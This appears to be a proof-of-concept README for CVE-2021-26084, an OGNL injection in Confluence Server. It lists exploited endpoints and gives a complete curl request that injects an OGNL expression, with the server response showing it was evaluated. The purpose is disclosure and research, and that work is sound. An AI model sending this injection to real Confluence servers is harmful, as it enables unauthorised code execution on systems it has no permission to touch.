# CVE-2021-26084 (PoC) | Confluence Server Webwork OGNL injection

An OGNL injection vulnerability exists that would allow an authenticated user, and in some instances unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance.

![poc](https://user-images.githubusercontent.com/3140111/131589227-c305cfb8-bcb9-4c87-a814-9b898fd2f393.png)

My fight to locate the entrypoints and injections XD 

Fight (1) | Fight (2)
 --- | ---
![2021_09_01_00_37_23_Oops_an_error_has_occurred_Confluence_Chromium](https://user-images.githubusercontent.com/3140111/131591912-bfe20ca8-df08-477c-af1c-1c3f3aacbb17.png) | ![2021_09_01_00_40_42_Oops_an_error_has_occurred_Confluence_Chromium](https://user-images.githubusercontent.com/3140111/131591918-1023e2de-3391-46cd-af2a-14d9cac25e63.png)

Confluence Entrypoints Exploited 

```
https://<REDACTED>/users/user-dark-features
https://<REDACTED>/login
https://<REDACTED>/pages/templates2/viewpagetemplate.action 
https://<REDACTED>/template/custom/content-editor
https://<REDACTED>/templates/editor-preload-container
```
My first manual inspection: Note: Pre-Authenticated user  

```
# curl -i -s -k -X $'POST' -H $'Host: <REDACTED>' -H $'User-Agent: alex666' -H $'Connection: close' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 44' -b $'JSESSIONID=<REDACTED>' --data-binary $'queryString=alt3kx\\u0027%2b#{6*666}%2b\\u0027' $'https://<REDACTED>/pages/createpage-entervariables.action'

Server Response: 

HTTP/1.1 200 
X-ASEN: <REDACTED>
Expires: Thu, 01 Jan 1970 00:00:00 GMT
<REDACTED>

[../snip]
<input type="hidden" name="queryString" value="alt3kx{3996=null}" />
```

# References: 
https://jira.atlassian.com/browse/CONFSERVER-67940 <br/>
https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html <br/>

Amazing writeup posted here: <br/> 
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md

Some hints very useful by: <br/>
<em><a href="https://twitter.com/wvuuuuuuuuuuuuu" rel="nofollow">@wvuuuuuuuuuuuuu</a></em><br/>
<em><a href="https://twitter.com/iamnoooob" rel="nofollow">@iamnoooob</a></em><br/>
# Author
Alex Hernandez aka <em><a href="https://twitter.com/_alt3kx_" rel="nofollow">(@\_alt3kx\_)</a></em>
